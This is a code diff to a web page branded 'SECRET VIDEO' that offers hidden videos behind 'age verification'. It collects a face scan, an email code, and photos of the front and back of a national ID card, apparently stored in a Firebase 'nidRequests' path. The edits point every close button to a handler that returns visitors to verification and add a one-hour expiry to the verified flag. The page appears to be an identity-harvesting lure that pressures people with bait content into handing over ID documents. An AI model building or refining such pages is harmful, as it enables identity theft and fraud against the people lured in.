@@ -162,7 +162,7 @@
       <div class="hdr-left">
         <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
       </div>
-      <button type="button" class="close-btn" onclick="openGallery()">✕</button>
+      <button type="button" class="close-btn" onclick="closeToVerification()">✕</button>
     </div>
     <h1 class="ttl">VERIFY YOUR AGE TO CONTINUE</h1>
     <p class="sub">Safe, secure, and free.</p>
@@ -201,7 +201,7 @@
         <button type="button" class="back-btn" onclick="goPage('optPage')"><i class="fa-solid fa-chevron-left"></i></button>
         <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
       </div>
-      <button type="button" class="close-btn" onclick="openGallery()">✕</button>
+      <button type="button" class="close-btn" onclick="closeToVerification()">✕</button>
     </div>
     <h2 class="sttl">When you start...</h2>
     <div class="sline"><i class="fa-solid fa-circle-check"></i> Center your face</div>
@@ -222,7 +222,7 @@
         <button type="button" class="back-btn" onclick="goPage('optPage')"><i class="fa-solid fa-chevron-left"></i></button>
         <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
       </div>
-      <button type="button" class="close-btn" onclick="openGallery()">✕</button>
+      <button type="button" class="close-btn" onclick="closeToVerification()">✕</button>
     </div>
     <h2 class="sttl">📧 Email Verification</h2>
     <p style="text-align:center; color:#777; font-size:14px; margin-bottom:20px;">আপনার আসল ইমেইল দিন —<br>৬ ডিজিটের ভেরিফিকেশন কোড ইমেইলে যাবে</p>
@@ -243,7 +243,7 @@
         <button type="button" class="back-btn" onclick="goPage('emailPage')"><i class="fa-solid fa-chevron-left"></i></button>
         <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
       </div>
-      <button type="button" class="close-btn" onclick="openGallery()">✕</button>
+      <button type="button" class="close-btn" onclick="closeToVerification()">✕</button>
     </div>
     <h2 class="sttl">Enter Code</h2>
     <p style="text-align:center; color:#777; font-size:14px; margin-bottom:16px;">
@@ -261,7 +261,7 @@
         <button type="button" class="back-btn" onclick="goPage('optPage')"><i class="fa-solid fa-chevron-left"></i></button>
         <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
       </div>
-      <button type="button" class="close-btn" onclick="openGallery()">✕</button>
+      <button type="button" class="close-btn" onclick="closeToVerification()">✕</button>
     </div>
     <h2 class="sttl" style="font-size:22px; display:flex; align-items:center; justify-content:center; gap:8px;">🪪 NID Card Verification</h2>
     <p style="text-align:center; color:#666; font-size:14px; margin-bottom:18px; font-weight:500;">গ্যালারি থেকে এনআইডি কার্ডের সামনের ও পিছনের ছবি সিলেক্ট করুন</p>
@@ -332,7 +332,7 @@
       <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname" style="font-size:20px;">SECRET<span>VIDEO</span></span></div>
       <div class="right-icons">
         <i class="fa-solid fa-magnifying-glass" onclick="alert('Search feature')"></i>
-        <button type="button" class="close-btn" onclick="goPage('optPage')" style="font-size: 26px;">✕</button>
+        <button type="button" class="close-btn" onclick="closeToVerification()" style="font-size: 26px;">✕</button>
         <i class="fa-solid fa-right-from-bracket" style="color:#e50914; padding-left: 5px;" title="Logout" onclick="handleLogout()"></i>
       </div>
     </div>
@@ -348,7 +348,7 @@
     </div>
   </div>
 
-  <!-- ✅ ভিডিও প্লেয়ার মোডাল (বাইরে টাচ করলে আর কাটবে না, শুধু X বাটনে কাটবে) -->
+  <!-- ✅ ভিডিও প্লেয়ার মোডাল -->
   <div id="playerModal">
     <div class="player-container">
       <button type="button" class="pl-x" onclick="closePlayer()">✕</button>
@@ -574,9 +574,27 @@
     };
 
     window.openGallery = () => {
+      // ✅ ১ ঘণ্টার জন্য ভেরিফিকেশন সময় সংরক্ষণ (৩৬০০০০০ মিলিভসেকেন্ড = ১ ঘণ্টা)
       localStorage.setItem('ageVerified18', 'yes');
+      localStorage.setItem('verifyTime18', Date.now().toString());
       buildGallery();
       goPage('galleryPage');
+    };
+
+    // ✅ ক্লোজ বাটন হ্যান্ডলার: ভেরিফিকেশন মেয়াদ না থাকলে সরাসরি ভেরিফিকেশন পেজে নিয়ে যাবে
+    window.closeToVerification = () => {
+      const verified = localStorage.getItem('ageVerified18');
+      const verifyTime = localStorage.getItem('verifyTime18');
+      const ONE_HOUR = 60 * 60 * 1000;
+
+      if (verified === 'yes' && verifyTime && (Date.now() - parseInt(verifyTime) < ONE_HOUR)) {
+        buildGallery();
+        goPage('galleryPage');
+      } else {
+        localStorage.removeItem('ageVerified18');
+        localStorage.removeItem('verifyTime18');
+        goPage('optPage');
+      }
     };
 
     window.sendCode = async () => {
@@ -777,19 +795,29 @@
       }, 3000);
     }
 
+    // ✅ লগআউট হ্যান্ডলার: ভেরিফিকেশন মুছে ফেলবে এবং প্রথম পেজে পাঠাবে
     window.handleLogout = () => {
       if (confirm("আপনি কি লগআউট করতে চান?")) {
         localStorage.removeItem('ageVerified18');
+        localStorage.removeItem('verifyTime18');
         goPage('optPage');
       }
     };
 
     window.onload = async function() {
       const verified = localStorage.getItem('ageVerified18');
-      if (verified === 'yes') {
+      const verifyTime = localStorage.getItem('verifyTime18');
+      const ONE_HOUR = 60 * 60 * 1000; // ১ ঘণ্টা
+
+      // ✅ চেক করা হচ্ছে ১ ঘণ্টা পার হয়েছে কিনা
+      if (verified === 'yes' && verifyTime && (Date.now() - parseInt(verifyTime) < ONE_HOUR)) {
         buildGallery();
         goPage('galleryPage');
       } else {
+        // মেয়াদ শেষ হলে বা ভেরিফাই না করা থাকলে ক্লিয়ার করে দেওয়া
+        localStorage.removeItem('ageVerified18');
+        localStorage.removeItem('verifyTime18');
+
         try {
           if (!auth.currentUser) await signInAnonymously(auth);
           const snap = await get(ref(db, 'nidRequests/' + currentUserId));
